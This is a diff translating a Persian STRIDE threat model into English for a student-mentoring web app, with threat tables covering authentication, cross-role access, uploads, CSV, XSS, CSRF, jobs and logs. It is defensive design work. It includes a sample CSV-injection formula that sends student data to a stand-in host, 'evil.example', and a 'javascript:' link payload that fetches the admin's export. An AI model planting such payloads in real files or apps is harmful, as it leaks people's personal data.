+| A3 | D | **Deliberate account lockout**: every 15 minutes the attacker sends 5 wrong passwords for the coach's mobile number. The coach cannot log in, and the only recovery path goes through the admin themselves | Medium | — | The lockout is per mobile number regardless of device. There is no independent recovery path for the sole admin | C2, SEC-R2, SEC-R3, SEC-T7 |
+| A4 | S/I | **IP spoofing**: if the code reads the first value of `X-Forwarded-For`, the attacker sends an arbitrary value to bypass the IP lockout, and the fake IP is recorded in `sessions` and `audit_log` | Medium | — | The rule for reading the IP behind the App Service proxy is not defined | C2, SEC-R4 |
+| A5 | I | **User enumeration** through differences in the login response or response time | Low | Identical response, dummy hash | If the lockout is counted only for existing mobile numbers, `429` reveals whether a mobile number exists | SEC-R6 |
+| A6 | S | **Leaked invite or reset link**: the token is in the path `/invite/<token>`. So it stays (1) in the host's HTTP log and the pino request log, (2) in the browser history and sync, (3) in a forwarded Telegram group or message, and (4) in the `Referer` header if the page has an external link. Whoever opens it before its owner sets a password and takes over the account. If the target is an admin or mentor account, the severity is higher | High | 256 bits, single use, 7 days / 24 hours, invalidated on re-creation, the name is shown | The token is in the URL; there is no second factor for acceptance; the first admin's invite link lives for 7 days | C1, SEC-T1..T7 |
+| A7 | S | **Acceptance via a forwarded link without the account owner's knowledge**. The real owner only sees `410` and may not report it | Medium | — | The staff UI does not show "accepted at ... from device ..." | SEC-T5 |
+| A8 | S | **Session fixation** | Low | A fresh session on login and acceptance; the `__Host-` prefix prevents cookie injection from a subdomain | Rotating the current session after a password change is not stated explicitly | SEC-S4 |
+| A9 | S/E | **Theft of a staff session** (the coach's unlocked phone, a shared device). The admin session is 30 days sliding and 90 days absolute, and there is no two-step login | Medium | Revocation from "My devices"; `HttpOnly` | The staff session lifetime is the same as the student's. The riskiest action (exporting all students as CSV) does not require re-confirmation | C2, SEC-S2, SEC-S7 |
+| A10 | D | **Taking the server down with argon2**: each hash takes about 19 MB of memory. 80 concurrent login requests (even with non-existent mobile numbers, since the dummy hash is also computed) need about 1.5 GB of memory and take down the B1 | Medium | — | A concurrency limit on hashing | SEC-P5 |
+| A11 | I | **Leak of the password hash to the browser**: an RSC passes an entire `users` row to a client component and `password_hash` is serialized into the page payload | Medium | DTOs | There is no rule for "explicit column selection" in the repo; the canary test does not look for the hash | SEC-A9, T-CANARY |
+| A12 | R | A user denies having seen or done a reset link or a role change | Low | `audit_log` for sensitive actions | Re-creating an invite link (also by a mentor), changing a note's `visibility`, account lockout and account deletion are not logged | SEC-L7 |
 
-### ۳-۲. دسترسی بین نقش‌ها (IDOR و ارتقای دسترسی)
+### 3-2. Cross-role access (IDOR and privilege escalation)
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| B1 | I | **مشاور به هنرجوی مشاور دیگر** از راه شناسه‌ی منبع تکی (`/tasks/:id`، `/notes/:id`، `/profiles/:id`، `/questions/:id`، `/reminders/:id`، `/flags/:id/clear`، `/milestones/:id/*`، `/submissions/:id/review`، `/attachments/:id`) | بالا | `staffStudentScope`؛ `404`؛ ماتریس تست | طراحی درست است؛ خطر در پیاده‌سازی است. هر service باید `student_id` را از والد پیدا کند، و برای منابع دولایه (`reviews` ← `submissions` ← `tasks`) این آسان فراموش می‌شود | SEC-A1، SEC-A2، ماتریس |
-| B2 | E/T | **شناسه‌های ارجاعی در بدنه**: مشاور کاری برای هنرجوی خودش با `profileId` هنرجوی دیگری می‌سازد. با تحویل، `profile_snapshot` روی پروفایل آن هنرجو نوشته می‌شود. یا هنرجو `POST /me/questions {taskId: <کار هنرجوی دیگر>}` می‌فرستد و عنوان آن کار در رشته‌اش نمایش داده می‌شود. یا `mentorId`، `reviewerId`، `assigneeId` و `ownerId` به شناسه‌ی یک هنرجو اشاره می‌کنند | بالا | — | ADR-0004 فقط منبع اصلی را دامنه‌سنجی می‌کند. برای شناسه‌های ارجاعی قاعده‌ای ندارد | C3، SEC-A3 |
-| B3 | I/T | **ربودن پیوست**: کاربری `attachmentIds` پیوست دیگری را در تحویل یا پیام خودش می‌فرستد. پیوست به والد تازه وصل می‌شود و او به آن «دسترسی والد» پیدا می‌کند (یا پیوست از تحویل صاحبش جدا می‌شود). سناریوی واقعی: مشاور سابق که شناسه‌ها را از قبل دیده، پس از تغییر مشاور آن‌ها را به سؤال یک هنرجوی خودش وصل می‌کند و دوباره به فایل‌ها دسترسی پیدا می‌کند. UUIDv7 حدس‌زدنی نیست، پس این سناریو فقط برای کسی است که شناسه را قبلاً دیده | متوسط | «دسترسی به فایل = دسترسی به والد» | شرط `status='pending' AND uploaded_by = actor` هنگام وصل کردن نوشته نشده است | C4، SEC-U9 |
-| B4 | **E** | **مشاور ← مدیر**: `POST /users/:id/invite-link` برای مشاور «فقط هنرجوی دعوت‌نشده‌ی در دامنه» مجاز است. اگر پیاده‌سازی فقط «اگر ردیف `students` هست دامنه را بسنج» بنویسد، برای کاربر `invited` با نقش `admin` (که ردیف `students` ندارد) بررسی دامنه رد نمی‌شود. مشاور لینک دعوت مدیر را می‌سازد، خودش آن را باز می‌کند و مدیر می‌شود | **بالا** | تعریف نقش در `api.md` | شرط «`role = 'student'`» صریح نیست | C3، SEC-A4، تست |
-| B5 | I | **هنرجو به یادداشت داخلی یا سلامت** از مسیرهای مشترک کارکنان و هنرجو (`GET /tasks/:id`، `GET /questions/:id`، `/attachments/:id`) که بر اساس نقش DTO متفاوت برمی‌گردانند. اگر شاخه‌ی نقش اشتباه باشد، `StaffTaskDTO` یا `studentSummary` به هنرجو می‌رسد | بالا | DTO جدا، lint import، تست قناری | تست قناری فقط رشته‌های یکتا را می‌گردد، نه فیلدهای اضافه (مثلاً `reviewerId`، `revisionCount`، `studentSummary`) | SEC-A5، T-DTO |
-| B6 | I | **نشت از کانال‌های جانبی به هنرجو**: `platform_profiles.notes` برای هنرجو دیده می‌شود ولی مشاور ممکن است آن را مثل یادداشت داخلی پر کند. تغییر `visibility` یک یادداشت از `internal` به `shared` آن را فوراً به هنرجو نشان می‌دهد | متوسط | توضیح در `data-model.md` | در UI برچسب «هنرجو این را می‌بیند» و تأیید تغییر visibility الزام نشده است | SEC-F6، SEC-L7 |
-| B7 | E | **دسترسی ماندگار پس از از دست دادن دامنه**: `PATCH /notes/:id` و `DELETE` برای «نویسنده» و `PATCH /reviews/:id` برای «بازبین» مجازند. مشاوری که هنرجو از او گرفته شده، هنوز یادداشت‌هایش را می‌خواند، ویرایش می‌کند یا `shared` می‌کند | متوسط | — | شرط نویسندگی بدون شرط دامنه | C3، SEC-A6 |
-| B8 | E/T | **mass assignment**: هنرجو در `PATCH /me/student` فیلد `primaryMentorId` یا `currentStageId` می‌فرستد. مشاور در `PATCH /students/:id` فیلد `primaryMentorId` می‌فرستد. هنرجو در `POST /me/milestones` فیلد `status: 'approved'` می‌فرستد | متوسط | فهرست سفید در `data-model.md` ۲-۳ | الزام zod `.strict()` (رد کلید ناشناخته) صریح نیست | SEC-A7 |
-| B9 | I | **مشاورِ مسئول سؤال بیرون از دامنه** با `GET /students/:id/summary` پس از بسته شدن سؤال هم خلاصه‌ی پرونده را می‌بیند | پایین | محدود به `summary` | شرط «سؤال **باز** که assignee آن خودش است» صریح نیست | SEC-A8 |
-| B10 | E | **دور زدن کنترل دسترسی با middleware یا Server Action**: Next.js در ۲۰۲۵ یک آسیب‌پذیری دور زدن middleware داشت (CVE-2025-29927). Server Actionها endpoint عمومی هستند و از `routes.manifest.ts` و ماتریس تست جا می‌مانند | متوسط | دسترسی در service، نه در route (ADR-0004) | منع Server Action و «middleware فقط برای هدر» صریح نیست | SEC-A10، SEC-A11 |
-| B11 | I | `DELETE /auth/sessions/:id` بدون شرط `user_id = actor` نشست کاربر دیگر را می‌بندد؛ `GET /auth/sessions` IP دیگران را نشان می‌دهد | پایین | «فقط نشست‌های خودش» | — (فقط در تست بیاید) | ماتریس |
+| B1 | I | **A mentor accessing another mentor's student** through a single-resource ID (`/tasks/:id`, `/notes/:id`, `/profiles/:id`, `/questions/:id`, `/reminders/:id`, `/flags/:id/clear`, `/milestones/:id/*`, `/submissions/:id/review`, `/attachments/:id`) | High | `staffStudentScope`; `404`; test matrix | The design is right; the risk is in the implementation. Every service must find `student_id` from the parent, and for two-level resources (`reviews` ← `submissions` ← `tasks`) this is easy to forget | SEC-A1, SEC-A2, matrix |
+| B2 | E/T | **Referenced IDs in the body**: a mentor creates a task for their own student with another student's `profileId`. On submission, `profile_snapshot` is written onto that student's profile. Or a student sends `POST /me/questions {taskId: <another student's task>}` and that task's title is shown in their string. Or `mentorId`, `reviewerId`, `assigneeId` and `ownerId` point to a student's ID | High | — | ADR-0004 checks scope only for the primary resource. It has no rule for referenced IDs | C3, SEC-A3 |
+| B3 | I/T | **Hijacking an attachment**: a user sends another attachment's `attachmentIds` in their own submission or message. The attachment gets linked to the new parent, and they gain "parent access" to it (or the attachment is detached from its owner's submission). Real scenario: a former mentor who saw the IDs earlier links them, after a mentor change, to a question of one of their own students and regains access to the files. UUIDv7 is not guessable, so this scenario only applies to someone who has seen the ID before | Medium | "File access = access to the parent" | The condition `status='pending' AND uploaded_by = actor` is not written for linking | C4, SEC-U9 |
+| B4 | **E** | **Mentor → admin**: `POST /users/:id/invite-link` is allowed for a mentor only for "a not-yet-invited student in scope". If the implementation only says "if a `students` row exists, check scope", then for an `invited` user with the `admin` role (who has no `students` row) the scope check is skipped. The mentor creates the admin's invite link, opens it themselves and becomes admin | **High** | Role definition in `api.md` | The condition "`role = 'student'`" is not explicit | C3, SEC-A4, test |
+| B5 | I | **A student reaching internal notes or health** through the paths shared by staff and students (`GET /tasks/:id`, `GET /questions/:id`, `/attachments/:id`) that return a different DTO by role. If the role branch is wrong, `StaffTaskDTO` or `studentSummary` reaches the student | High | Separate DTOs, import lint, canary test | The canary test searches only for unique strings, not for extra fields (for example `reviewerId`, `revisionCount`, `studentSummary`) | SEC-A5, T-DTO |
+| B6 | I | **Leak through side channels to the student**: `platform_profiles.notes` is visible to the student but a mentor may fill it like an internal note. Changing a note's `visibility` from `internal` to `shared` immediately shows it to the student | Medium | An explanation in `data-model.md` | A "the student sees this" label in the UI and a confirmation for changing visibility are not required | SEC-F6, SEC-L7 |
+| B7 | E | **Persistent access after losing scope**: `PATCH /notes/:id` and `DELETE` are allowed for the "author" and `PATCH /reviews/:id` for the "reviewer". A mentor whose student was taken away still reads, edits or makes their notes `shared` | Medium | — | The authorship condition has no scope condition | C3, SEC-A6 |
+| B8 | E/T | **Mass assignment**: a student sends `primaryMentorId` or `currentStageId` in `PATCH /me/student`. A mentor sends `primaryMentorId` in `PATCH /students/:id`. A student sends `status: 'approved'` in `POST /me/milestones` | Medium | Whitelist in `data-model.md` 2-3 | The requirement for zod `.strict()` (rejecting unknown keys) is not explicit | SEC-A7 |
+| B9 | I | **A mentor responsible for a question, outside their scope**, sees the case summary with `GET /students/:id/summary` even after the question is closed | Low | Limited to `summary` | The condition "an **open** question that they are the assignee of" is not explicit | SEC-A8 |
+| B10 | E | **Bypassing access control through middleware or a Server Action**: in 2025 Next.js had a middleware bypass vulnerability (CVE-2025-29927). Server Actions are public endpoints and escape `routes.manifest.ts` and the test matrix | Medium | Access in the service, not in the route (ADR-0004) | A ban on Server Actions and "middleware only for headers" is not explicit | SEC-A10, SEC-A11 |
+| B11 | I | `DELETE /auth/sessions/:id` without the condition `user_id = actor` closes another user's session; `GET /auth/sessions` shows other people's IPs | Low | "Only their own sessions" | — (just cover it in tests) | matrix |
 
-### ۳-۳. آپلود فایل و تصویر
+### 3-3. File and image upload
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| U1 | T/E | **فایل جعلی** (HTML یا SVG یا polyglot با `Content-Type: image/png`) که از دامنه‌ی ما سرو شود و در مرورگر اجرا شود (XSS ذخیره‌شده) | متوسط | فقط jpeg/png/webp؛ بازکدگذاری با sharp؛ سرو از سرور | تشخیص نوع از محتوای فایل (نه سرآیند کلاینت) و سرآیندهای پاسخ دانلود (`nosniff`، CSP جدا) صریح نیست | SEC-U1، SEC-U6 |
-| U2 | D | **بمب فشرده‌سازی تصویر**: یک PNG یا WebP پنج‌مگابایتی با ابعاد ۵۰ هزار در ۵۰ هزار پیکسل، حافظه‌ی sharp و B1 را تمام می‌کند | متوسط | سقف ۵ مگابایت | محدودیت پیکسل؛ هم‌زمانی پردازش | SEC-U2، SEC-U3 |
-| U3 | D | **بافر کردن بدنه‌ی بزرگ**: Route Handler در Next.js برای `request.formData()` و `request.json()` سقف پیش‌فرض ندارد. بدنه‌ی ۵۰۰ مگابایتی پیش از بررسی ۵ مگابایت در حافظه خوانده می‌شود | متوسط | `MAX_UPLOAD_BYTES` | محل اعمال سقف (پیش از خواندن بدنه) و سقف بدنه‌ی JSON تعریف نشده | SEC-U4، SEC-V1 |
-| U4 | I | **حریم خصوصی تصویر**: GPS و مدل دستگاه در EXIF؛ اسکرین‌شات قرارداد با نام کارفرما | متوسط | حذف EXIF | چرخش پیش از حذف EXIF (وگرنه عکس کج می‌شود و کاربر دوباره و بی‌دقت آپلود می‌کند)؛ راهنمای UI برای پوشاندن نام کارفرما | SEC-U5، SEC-F7 |
-| U5 | D | **پر کردن ذخیره‌سازی** با هزاران پیوست `pending` | پایین | پاک‌سازی ۲۴ ساعته | سهمیه به ازای کاربر | SEC-U7 |
-| U6 | I | **دسترسی مستقیم به Blob**: کانتینر عمومی یا کلید حساب ذخیره‌سازی با دسترسی کامل در تنظیمات برنامه | متوسط | سرو از سرور (بدون لینک مستقیم) | سطح دسترسی کانتینر و دامنه‌ی اعتبارنامه تعریف نشده | SEC-K3 |
-| U7 | T | **آسیب‌پذیری کتابخانه‌ی تصویر** (libvips داخل sharp) | پایین | — | به‌روزرسانی خودکار وابستگی‌ها | SEC-D1 |
+| U1 | T/E | **A fake file** (HTML, SVG or polyglot with `Content-Type: image/png`) served from our domain and executed in the browser (stored XSS) | Medium | Only jpeg/png/webp; re-encoding with sharp; served from the server | Detecting the type from the file content (not the client header) and the download response headers (`nosniff`, a separate CSP) are not explicit | SEC-U1, SEC-U6 |
+| U2 | D | **Image decompression bomb**: a 5 MB PNG or WebP with dimensions of 50,000 by 50,000 pixels exhausts sharp's memory and the B1 | Medium | 5 MB limit | Pixel limit; processing concurrency | SEC-U2, SEC-U3 |
+| U3 | D | **Buffering a huge body**: the Route Handler in Next.js has no default limit for `request.formData()` and `request.json()`. A 500 MB body is read into memory before the 5 MB check | Medium | `MAX_UPLOAD_BYTES` | Where the limit is enforced (before reading the body) and the JSON body limit are not defined | SEC-U4, SEC-V1 |
+| U4 | I | **Image privacy**: GPS and device model in EXIF; a contract screenshot with the client's name | Medium | EXIF stripping | Rotation before stripping EXIF (otherwise the photo ends up sideways and the user re-uploads carelessly); a UI hint to cover the client's name | SEC-U5, SEC-F7 |
+| U5 | D | **Filling up storage** with thousands of `pending` attachments | Low | 24-hour cleanup | Per-user quota | SEC-U7 |
+| U6 | I | **Direct Blob access**: a public container, or a storage account key with full access in the app settings | Medium | Served from the server (no direct link) | The container access level and the scope of the credential are not defined | SEC-K3 |
+| U7 | T | **Image library vulnerability** (libvips inside sharp) | Low | — | Automatic dependency updates | SEC-D1 |
 
-### ۳-۴. CSV ورودی و خروجی
+### 3-4. CSV import and export
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| V1 | T/I | **CSV injection در خروجی اکسل**: هنرجو `messenger_handle` یا `primary_skill` یا متن مدرک نقطه‌ی عطف را `=HYPERLINK("https://evil.example/?d="&B2&C2,"جزئیات")` می‌گذارد. مربی `students.csv` را در اکسل باز می‌کند و روی سلول کلیک می‌کند. موبایل و نام هنرجوهای دیگر به سایت مهاجم می‌رود. فرمول‌های قدیمی‌تر DDE هم اگر اکسل هشدار را نشان دهد و کاربر تأیید کند، اجرا می‌شوند | متوسط | فقط مدیر خروجی می‌گیرد؛ `audit_log` | خنثی‌سازی سلول‌ها تعریف نشده | SEC-V2 |
-| V2 | I | **خروجی CSV یعنی کل داده‌ی ح۳ روی لپ‌تاپ**: یک نشست دزدیده‌شده‌ی مدیر یا یک لپ‌تاپ گم‌شده، فهرست «نام + موبایل + لینک آپورک» همه را بیرون می‌برد | متوسط | فقط مدیر؛ ممیزی | ستون‌های خروجی تعریف نشده؛ تأیید دوباره‌ی رمز نیست | SEC-V3، SEC-S7 |
-| V3 | T/D | **فایل ورودی مخرب**: `api.md` ورود از CSV **و XLSX** را می‌گوید. بسته‌ی npm رایج `xlsx` (SheetJS) آخرین نسخه‌اش روی npm 0.18.5 است و آسیب‌پذیری‌های prototype pollution (CVE-2023-30533) و ReDoS (CVE-2024-22363) دارد که نسخه‌ی اصلاح‌شده‌شان فقط بیرون از npm منتشر شده است. XLSX خودش zip است (بمب zip) | پایین | فقط مدیر؛ `dryRun` | قالب، سقف حجم و سقف تعداد ردیف تعریف نشده | C6، SEC-V4 |
-| V4 | I | **نتیجه‌ی ورود گروهی** پاسخی با ده‌ها `inviteUrl` است. اگر لاگ یا cache شود، ده‌ها حساب در خطرند | متوسط | — | `no-store` و منع لاگ بدنه | SEC-V5، SEC-L1 |
+| V1 | T/I | **CSV injection in the Excel output**: a student sets `messenger_handle` or `primary_skill` or the milestone evidence text to `=HYPERLINK("https://evil.example/?d="&B2&C2,"details")`. The coach opens `students.csv` in Excel and clicks the cell. The other students' mobile numbers and names go to the attacker's site. Older DDE formulas also run if Excel shows the warning and the user confirms | Medium | Only the admin exports; `audit_log` | Neutralizing cells is not defined | SEC-V2 |
+| V2 | I | **A CSV export means all Class 3 data on a laptop**: a stolen admin session or a lost laptop takes out the "name + mobile + Upwork link" list for everyone | Medium | Admin only; audit | Export columns are not defined; no password re-confirmation | SEC-V3, SEC-S7 |
+| V3 | T/D | **Malicious input file**: `api.md` mentions import from CSV **and XLSX**. The common npm package `xlsx` (SheetJS) has 0.18.5 as its latest version on npm and has prototype pollution (CVE-2023-30533) and ReDoS (CVE-2024-22363) vulnerabilities whose fixed version was published only outside npm. XLSX is itself a zip (zip bomb) | Low | Admin only; `dryRun` | Format, size limit and row count limit are not defined | C6, SEC-V4 |
+| V4 | I | **The bulk import result** is a response with dozens of `inviteUrl`s. If it is logged or cached, dozens of accounts are at risk | Medium | — | `no-store` and a ban on logging the body | SEC-V5, SEC-L1 |
 
-### ۳-۵. XSS در متن‌های آزاد
+### 3-5. XSS in free-text fields
 
-ورودی‌های آزاد **هنرجو** که در صفحه‌های **کارکنان** (پرارزش‌ترین هدف: نشست مدیر) نمایش داده می‌شوند: `messenger_handle`، `primary_skill`، `goal_90d`، `self_reported_blocker`، فیلدهای پروفایل (`public_url`، `headline`، `niche`، `notes`)، متن snapshot، تحویل (`body_text`، `links`، `job_post_text`، `proposal_text`، `profile_text`)، سؤال (`subject`، `body`، `links`)، check-in، `evidence_text`، `attachments.original_name`. ورودی‌های **کارکنان** که هنرجو می‌بیند: یادداشت اشتراکی، بازخورد، شرح کار، `content_links` مرحله.
+Free-text inputs from the **student** that are displayed on **staff** pages (the highest-value target: the admin session): `messenger_handle`, `primary_skill`, `goal_90d`, `self_reported_blocker`, profile fields (`public_url`, `headline`, `niche`, `notes`), snapshot text, submission (`body_text`, `links`, `job_post_text`, `proposal_text`, `profile_text`), question (`subject`, `body`, `links`), check-in, `evidence_text`, `attachments.original_name`. Inputs from **staff** that the student sees: shared notes, feedback, task descriptions, stage `content_links`.
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| X1 | E | **لینک `javascript:`**: هنرجو در `links` یک سؤال `javascript:fetch('/api/v1/exports/students.csv').then(…)` می‌گذارد. مربی روی «لینک» کلیک می‌کند و کد در نشست مدیر اجرا می‌شود | بالا | `https://` برای پروفایل و تحویل | قاعده‌ی `https://` برای `links` سؤال و پیام، `content_links` مرحله و هر لینک‌سازی خودکار در متن آزاد نیامده است | SEC-X2، SEC-X3 |
-| X2 | E | **HTML خام**: توسعه‌دهنده برای «حفظ خط‌های جدید» یا «هایلایت جستجو» از `dangerouslySetInnerHTML` استفاده می‌کند | بالا | React به‌طور پیش‌فرض escape می‌کند | منع صریح و lint | SEC-X1، SEC-X4 |
-| X3 | E | **تزریق در `<script>`**: داده‌ی اولیه با `JSON.stringify` دستی در یک تگ `<script>` گذاشته می‌شود و `</script>` در نام هنرجو آن را می‌شکند | متوسط | — | منع | SEC-X4 |
-| X4 | S | **فریب جهت متن (bidi)**: نام یا عنوان لینک با نویسه‌ی `U+202E` متن را برعکس نشان می‌دهد (مثلاً نام فایل یا دامنه‌ی جعلی در رابط RTL) | پایین | نرمال‌سازی ADR-0008 | حذف نویسه‌های کنترل جهت (نه نیم‌فاصله) | SEC-X5 |
-| X5 | E | **نبود لایه‌ی دوم**: اگر یکی از موارد بالا جا بماند، چیزی جلوی اجرای اسکریپت را نمی‌گیرد | متوسط | — | CSP تعریف نشده | SEC-H1 |
-| X6 | I | **reverse tabnabbing و Referer**: لینک بیرونی با `target=_blank` و نشت مسیر داخلی (`/students/<id>`) در `Referer` به سایت مقصد | پایین | — | `rel` و `Referrer-Policy` | SEC-X6، SEC-H2 |
+| X1 | E | **A `javascript:` link**: a student puts `javascript:fetch('/api/v1/exports/students.csv').then(…)` in a question's `links`. The coach clicks the "link" and the code runs in the admin session | High | `https://` for profile and submission | The `https://` rule is missing for the `links` of questions and messages, stage `content_links`, and any automatic link-ification in free text | SEC-X2, SEC-X3 |
+| X2 | E | **Raw HTML**: the developer uses `dangerouslySetInnerHTML` to "preserve newlines" or "highlight search" | High | React escapes by default | An explicit ban and a lint rule | SEC-X1, SEC-X4 |
+| X3 | E | **Injection in `<script>`**: initial data is placed in a `<script>` tag with a hand-written `JSON.stringify`, and `</script>` in a student's name breaks out of it | Medium | — | Ban | SEC-X4 |
+| X4 | S | **Text direction deception (bidi)**: a name or link title with the `U+202E` character displays text reversed (for example a fake file name or domain in an RTL interface) | Low | ADR-0008 normalization | Removing directional control characters (not the half-space) | SEC-X5 |
+| X5 | E | **No second layer**: if one of the above is missed, nothing stops script execution | Medium | — | CSP is not defined | SEC-H1 |
+| X6 | I | **Reverse tabnabbing and Referer**: an external link with `target=_blank` and leakage of an internal path (`/students/<id>`) in `Referer` to the destination site | Low | — | `rel` and `Referrer-Policy` | SEC-X6, SEC-H2 |
 
-### ۳-۶. CSRF با کوکی نشست
+### 3-6. CSRF with the session cookie
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| F1 | T/E | سایت مهاجم فرم `multipart` یا `text/plain` به `POST /api/v1/users/:id/role` می‌فرستد (درخواست ساده که preflight ندارد) | متوسط | `SameSite=Lax` + بررسی `Origin` + الزام `Content-Type` | سه جزئیات: (۱) اگر `Origin` نبود؟ (۲) مقایسه‌ی دقیق origin (scheme + host + port)، نه `startsWith`؛ (۳) یک زیردامنه‌ی دیگرِ همان دامنه (مثلاً سایت وردپرسی `www.`) «same-site» است و `SameSite` جلویش را نمی‌گیرد. پس بررسی `Origin` دفاع اصلی است و باید سخت‌گیر باشد | SEC-C1..C5 |
-| F2 | T | **GET با اثر جانبی** (مثلاً `GET /logout` یا مصرف توکن با GET) با `Lax` از سایت دیگر اجرا می‌شود | پایین | همه‌ی mutationها غیر GET هستند | پیش‌نمایش لینک در تلگرام GET می‌زند. اگر GET توکن را مصرف کند، لینک پیش از رسیدن به هنرجو باطل می‌شود | SEC-C4، SEC-T3 |
-| F3 | T | **login CSRF**: مهاجم قربانی را با حساب خودش وارد می‌کند تا قربانی داده‌اش را در حساب مهاجم وارد کند | پایین | `Origin` روی `/auth/login` هم هست | — | تست |
-| F4 | I | **CORS باز**: کسی برای «تست موبایل» `Access-Control-Allow-Origin: *` همراه با credentials می‌گذارد | متوسط | — | منع صریح | SEC-C5 |
+| F1 | T/E | An attacker's site sends a `multipart` or `text/plain` form to `POST /api/v1/users/:id/role` (a simple request with no preflight) | Medium | `SameSite=Lax` + `Origin` check + `Content-Type` requirement | Three details: (1) what if `Origin` is absent? (2) compare the origin exactly (scheme + host + port), not with `startsWith`; (3) another subdomain of the same domain (for example a WordPress site at `www.`) is "same-site" and `SameSite` does not stop it. So the `Origin` check is the main defense and must be strict | SEC-C1..C5 |
+| F2 | T | A **GET with side effects** (for example `GET /logout` or consuming a token via GET) is triggered from another site under `Lax` | Low | All mutations are non-GET | Link previews in Telegram issue a GET. If a GET consumes the token, the link is invalidated before it reaches the student | SEC-C4, SEC-T3 |
+| F3 | T | **Login CSRF**: the attacker logs the victim in with the attacker's own account so the victim enters their data into the attacker's account | Low | `Origin` is also checked on `/auth/login` | — | test |
+| F4 | I | **Open CORS**: someone sets `Access-Control-Allow-Origin: *` together with credentials for "mobile testing" | Medium | — | Explicit ban | SEC-C5 |
 
-### ۳-۷. endpoint داخلی jobs و مسیرهای عملیاتی
+### 3-7. The internal jobs endpoint and operational paths
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| J1 | S/D | **`JOB_TRIGGER_SECRET` خالی**: اگر `JOBS_MODE=http-trigger` باشد و secret تنظیم نشده باشد، مقایسه‌ی `undefined === undefined` یا `"" === ""` درست درمی‌آید و هر کسی `health.sweep` و پاک‌سازی را بی‌وقفه اجرا می‌کند | متوسط | فقط در `http-trigger`؛ وگرنه `404` | «شکست امن» در شروع برنامه | SEC-J1 |
-| J2 | S | **حدس secret با زمان پاسخ** (مقایسه‌ی رشته‌ای غیرثابت‌زمان) | پایین | — | مقایسه‌ی ثابت‌زمان | SEC-J2 |
-| J3 | T | **پارامتر در بدنه**: اگر job از بدنه `studentId` یا تنظیمات بخواند، secret لورفته قدرت بیشتری می‌دهد | پایین | — | فهرست سفید نام‌ها؛ بدون پارامتر | SEC-J3 |
-| J4 | I | `/healthz` عمومی اطلاعات بیشتری (خطای دیتابیس، رشته‌ی اتصال) برگرداند | پایین | «بدون داده‌ی حساس» | — | SEC-J4 |
-| J5 | E | **CLI راه‌اندازی مدیر**: لینک دعوت اولین مدیر ۷ روز اعتبار دارد و در خروجی کنسول می‌ماند. اگر تنها مدیر رمزش را فراموش کند یا قفل شود، راه رسمی بازیابی نیست و کسی با SQL دستی در تولید حساب را دستکاری می‌کند | متوسط | فقط وقتی هیچ مدیری نیست | انقضای کوتاه؛ CLI بازیابی | SEC-T6، SEC-T7 |
+| J1 | S/D | **Empty `JOB_TRIGGER_SECRET`**: if `JOBS_MODE=http-trigger` and the secret is not set, the comparison `undefined === undefined` or `"" === ""` is true and anyone can run `health.sweep` and cleanup without limit | Medium | Only in `http-trigger`; otherwise `404` | "Fail safe" at application start | SEC-J1 |
+| J2 | S | **Guessing the secret by response time** (a non-constant-time string comparison) | Low | — | Constant-time comparison | SEC-J2 |
+| J3 | T | **Parameters in the body**: if a job reads `studentId` or settings from the body, a leaked secret grants more power | Low | — | Whitelist of names; no parameters | SEC-J3 |
+| J4 | I | The public `/healthz` returns more information (database error, connection string) | Low | "No sensitive data" | — | SEC-J4 |
+| J5 | E | **Admin bootstrap CLI**: the first admin's invite link is valid for 7 days and stays in the console output. If the sole admin forgets their password or gets locked out, there is no official recovery path and someone manipulates the account with manual SQL in production | Medium | Only when no admin exists | Short expiry; recovery CLI | SEC-T6, SEC-T7 |
 
-### ۳-۸. لاگ‌ها و مشاهده‌پذیری
+### 3-8. Logs and observability
 
-| # | STRIDE | تهدید و سناریو | شدت | کنترل فعلی طراحی | شکاف | اقدام |
+| # | STRIDE | Threat and scenario | Severity | Current design control | Gap | Action |
 |---|---|---|---|---|---|---|
-| L1 | I | **توکن در لاگ**: pino-http به‌طور پیش‌فرض `req.url` را لاگ می‌کند و `/invite/<token>` یا `/api/v1/auth/tokens/<token>` را کامل می‌نویسد. لاگ HTTP خود App Service (اگر روشن باشد) هم URL کامل را نگه می‌دارد و ما نمی‌توانیم آن را ماسک کنیم | بالا | «لاگ بدون توکن» (overview) | توکن در مسیر است، پس فقط با C1 حل می‌شود | C1، SEC-L2 |
-| L2 | I | **موبایل در لاگ**: (۱) جستجوی `GET /students?q=0912…` در URL؛ (۲) پیام خطای zod که مقدار ورودی را برمی‌گرداند؛ (۳) لاگ «ورود ناموفق برای +98912…»؛ (۴) خطای ردیف‌های CSV؛ (۵) لاگ پرس‌وجوی Drizzle با پارامترها؛ (۶) لاگ پرس‌وجوهای کند Postgres که پارامترهای bind را هم می‌نویسد | متوسط | «لاگ بدون بدنه‌ی درخواست» | ماسک و redact تعریف نشده | SEC-L1..L5 |
-| L3 | I | **کوکی و secret در لاگ** (سرآیند `cookie`، `set-cookie`، `x-job-secret`) | بالا | — | فهرست redact | SEC-L1 |
-| L4 | R | نبود هشدار روی رخدادهای امنیتی (موج ورود ناموفق، قفل حساب مدیر، خروجی CSV در ساعت غیرعادی) | پایین | `audit_log` | هشدار | SEC-L6 |
